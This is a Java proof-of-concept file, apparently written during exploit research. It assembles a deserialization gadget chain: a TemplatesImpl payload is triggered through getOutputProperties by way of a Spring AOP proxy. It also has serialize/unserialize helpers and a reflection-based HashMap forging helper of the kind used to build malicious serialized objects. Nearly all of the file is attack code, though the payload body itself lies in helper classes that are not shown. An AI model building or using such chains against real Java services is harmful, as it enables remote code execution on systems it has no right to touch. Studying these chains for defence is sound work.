import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.sql.SQLOutput;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class test {
    public static void main(String[] args) throws Exception {
//       1 Tostring ->object.method()
        Object poc = Reflections.getOutputProperties_payload();
        Object proxy = aop_tools.aop_tostring(poc,"getOutputProperties");
//        POJONode node = new POJONode(proxy);
//        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
//        setFieldValue(badAttributeValueExpException, "val", proxy);
//        HashMap hashMap = new HashMap();
//        hashMap.put(proxy, badAttributeValueExpException);
        proxy.toString();
//        proxy.toString();
// 2 get ->object.method(param)  代理目标/方法/get参数/传入参数
//        test_get test1 = new test_get();
//        Map proxy = (Map) aop_tools.aop_getter(test1,"test","username","AsaL1n");
//        proxy.get("username");

//        serialize(hashMap);
//        unserialize("ser.bin");
//








    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
